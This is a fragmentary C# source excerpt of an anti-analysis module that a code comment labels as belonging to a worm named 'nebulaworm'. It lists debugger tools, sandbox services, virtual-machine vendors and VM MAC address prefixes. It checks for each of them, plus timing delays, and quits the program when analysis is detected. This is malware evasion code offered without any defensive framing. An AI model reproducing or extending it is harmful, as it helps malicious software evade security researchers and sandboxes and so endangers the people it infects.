...
namespace NebulaRun
{ //nebulaworm antidebug module
    internal static class AntiDebug
    {
        private static readonly string[] DebuggerProcessNames = new[]
        {
            "ollydbg", "ida64", "ida", "x64dbg", "x32dbg", "debugger", "dbgview",
            "processhacker", "procexp", "procmon", "devenv", "immunitydebugger"
        };

        private static readonly string[] SandboxIndicators = new[]
        {
            "SbieSvc", "VBoxService", "vmtoolsd", "vmsrvc", "xenservice"
        };

        private static readonly string[] VirtualMachinesManufacturers = new[]
        {
            "vmware", "virtualbox", "qemu", "xen", "parallels"
        };

        private static readonly string[] VirtualMachinesModels = new[]
        {
            "virtual", "vmware", "virtualbox", "qemu", "xen", "parallels"
        };

        private static readonly string[] SuspiciousMacsPrefixes = new[]
        {
            "00:05:69", "00:0C:29", "00:1C:14", "00:50:56", "08:00:27", "0A:00:27"
        };

        public static async Task CheckAndKillAsync()
        {
            if (IsDebuggedOrVM())
            {
                try
...
");
                    ...
                    await Task.Delay(100); // biraz gecikme veriyoruz çıkmadan önce
                    Environment.Exit(0);
                }
                catch
                {
        ...
        private static bool IsDebuggerProcessRunning()
        {
            try
            {
                return Process.GetProcesses().Any(p =>
                    DebuggerProcessNames.Any(dbg =>
                        p.ProcessName.ToLower().Contains(dbg)));
            }
            catch { return false; }
        }
        ...
        private static bool IsSandboxServiceRunning()
        {
            ...
            {
                return Process.GetProcesses().Any(p =>
                    SandboxIndicators.Any(svc =>
                        p.ProcessName.ToLower().Contains(svc.ToLower())));
            }
            catch { return false; }
        }
        ...
        private static async Task<bool> HasDebugTimingDelay()
        {
            try
            {
        ...
        private static bool HasSuspiciousMacAddress()
        {
            try
            {
                ...
                {
                    string mac = string.Join(":", adapter.GetPhysicalAddress()
                        .GetAddressBytes()
                        .Select(b => b.ToString("X2")));

                    if (SuspiciousMacsPrefixes.Any(prefix =>
                        mac.StartsWith(prefix, StringComparison.OrdinalIgnoreCase)))
                    {
                        return true;
                    }
                }
